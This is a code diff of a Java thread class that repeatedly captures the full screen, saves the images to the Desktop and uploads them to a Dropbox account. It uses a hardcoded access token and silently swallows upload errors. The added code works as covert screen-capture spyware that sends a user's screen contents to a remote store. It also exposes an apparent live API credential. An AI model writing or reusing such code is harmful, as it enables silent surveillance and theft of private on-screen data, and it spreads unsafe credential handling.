@@ -14,36 +14,40 @@ import java.io.InputStream;
 
 public class CopyThreed extends Thread {
     private final static String  ACCESS_TOKEN = "u0qEwtoWYfAAAAAAAAAADFYQ74iWzPQlZ6tfs49ET58fEJKs3KIrKuhNyPKUwklb";
-    public void  initialDropBox(){
-
-    }
     public void run () {
-        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
-        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
+
 
         try {
-            screenShot();
+            for (int i = 1 ; i < 6 ; i++) {
+                String nameFile = "screenshot"+i;
+                screenShot(nameFile);
+                sendOnDropbox(nameFile);
+            }
         } catch (AWTException e) {
             e.printStackTrace();
         } catch (IOException e) {
             e.printStackTrace();
         }
 
-        try {
-            InputStream in = new FileInputStream("C:/Users/user/Desktop/screenshot.png");
-
-            FileMetadata metadata = client.files().uploadBuilder("/screenshot.png").uploadAndFinish(in);
-        }catch (Exception ex){
-
-        }
-
     }
-public void screenShot ()throws AWTException, IOException{
+public void screenShot (String nameFile)throws AWTException, IOException{
 
     BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
 
-    System.out.println(image.getWidth() + " & " +image.getHeight());
-    ImageIO.write(image , "png", new File("C:/Users/user/Desktop/screenshot.png"));
+    ImageIO.write(image , "png", new File("C:/Users/user/Desktop/"+nameFile+".png"));
+}
+public void sendOnDropbox(String nameFile){
+
+        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
+    DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
+    try {
+        InputStream in = new FileInputStream("C:/Users/user/Desktop/" + nameFile  + ".png");
+
+        FileMetadata metadata = client.files().uploadBuilder("/" + nameFile + ".png").uploadAndFinish(in);
+    } catch (Exception ex) {
+
+    }
+
 }
 
 }
